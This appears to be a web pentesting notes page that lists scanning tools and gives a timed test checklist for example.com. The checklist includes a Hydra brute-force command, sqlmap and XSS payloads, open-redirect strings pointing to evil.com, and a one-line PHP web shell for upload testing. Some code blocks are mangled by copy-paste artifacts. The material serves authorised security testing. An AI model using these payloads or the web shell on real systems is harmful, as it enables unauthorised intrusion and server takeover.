# webappnote

Apps 
 
# Security Tools and Techniques

This repository contains a compilation of various security tools, techniques, and resources commonly used in penetration testing and web application security assessments.

---

## Security Tools

### General Tools

- **[pphack](https://github.com/edoardottt/pphack)**: Specializes in client-side prototype pollution scanning.
- **[RVuln](https://github.com/yangr0/RVuln)**: Specializes in XSS scanning.
- **[OWASP ZAP](https://www.zaproxy.org/)**: Multi-purpose tool with a repeater similar to Burp Suite.
- **[Web-Scanner](https://github.com/Akshay7591/Web-Scanner?tab=readme-ov-file)**: Runs multiple enumeration scanners (Nmap, Whois, Traceroute, Nikto, etc.) at once.
- **[WhatWeb](https://github.com/jakbin/whatweb)**: A simpler alternative to the above tools with fewer features.
- **[OSTE-Meta-Scan](https://github.com/OSTEsayed/OSTE-Meta-Scan)**: Runs multiple tools like ZAP, Wapiti, Skipfish, Nikto, and Nuclei.
- **[Wapiti](https://wapiti-scanner.github.io/)**: A web application scanner.
- **[Nikto](https://github.com/sullo/nikto)**: A widely used vulnerability scanner.
- **[Nuclei](https://github.com/projectdiscovery/nuclei)**: A fast and customizable vulnerability scanner.
- **[Lynis](https://github.com/CISOfy/Lynis)**: A security auditing tool for UNIX-based systems.
- **[Trufflehog](https://github.com/trufflesecurity/Trufflehog-Chrome-Extension)**: Browser extension to find secrets on webpages as they load.
- **[MITMProxy](https://mitmproxy.org/)**: An open-source proxy for intercepting and modifying HTTP and HTTPS traffic.

### Enumeration Tools

- **Nmap**: Network exploration tool and vulnerability scanner.
- **Gobuster**: A tool for directory and DNS subdomain busting.
- **Feroxbuster**: A tool for directory brute-forcing and discovering hidden web content.
- **ffuf**: A fast web fuzzing tool.
- **wfuzz**: A web application fuzzer used for brute-forcing and testing hidden paths.

Quick Wins & High Impact (20 minutes)

### 1. Information Gathering

- Whois Lookup
  ```bash
  whois example.com
  DNS & Subdomain Enumeration
  bash
  ```

Copy
dig example.com any
amass enum -d example.com
sublist3r -d example.com
HTTP Headers & Server Info
bash

Copy
curl -I https://example.com
nikto -h https://example.com
Check robots.txt
bash

Copy
curl https://example.com/robots.txt 2. Mapping the Application

Directory & File Discovery
bash

Copy
gobuster dir -u https://example.com -w /path/to/wordlist.txt
Burp Suite Spider (if available)
Priority 2: Authentication & Session Testing (15 minutes)

3. Authentication Testing

Test default creds & simple brute force with Hydra
bash

Copy
hydra -l admin -P /path/to/passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
Check JWT tokens (decode & manipulate in Burp) 4. Session Management

Inspect cookies for Secure, HttpOnly flags
bash

Copy
curl -I https://example.com
Use Burp Suite to test session fixation & timeout
Priority 3: Injection, XSS & URL Redirect Testing (15 minutes)

5. SQL Injection

Quick automated scan with SQLMap
bash

Copy
sqlmap -u "https://example.com/page.php?id=1" --batch --dbs
Manual payloads in Burp Repeater (e.g., ' OR '1'='1) 6. Cross-Site Scripting (XSS)

Automated scan with XSStrike
bash

Copy
xsstrike -u "https://example.com/search?q=test"
Manual payloads:
html

Copy

<script>alert(1)</script>

"><img src=x onerror=alert(1)> 7. Open Redirect / URL Redirect Testing

Test URL parameters that redirect users, e.g.:

Copy
https://example.com/redirect?url=http://evil.com
Payloads to test:

Copy
http://evil.com
//evil.com
///evil.com
\evil.com
javascript:alert(1)
Use Burp Suite to intercept and modify redirect parameters
Priority 4: CSRF, File Upload & Security Misconfigurations (10 minutes)

8. CSRF Testing

Check for CSRF tokens on forms using Burp Suite
Replay requests without tokens to test protection 9. File Upload Testing

Try uploading a simple web shell or bypass file type restrictions using Burp Suite
Common payloads:
shell.php with <?php system($_GET['cmd']); ?>
Rename extensions (e.g., .php.jpg)
Modify Content-Type header in Burp to bypass filters 10. Security Misconfigurations

Nikto scan
bash

Copy
nikto -h https://example.com
Check HTTP methods with Nmap
bash

Copy
nmap --script http-methods -p 80,443 example.com
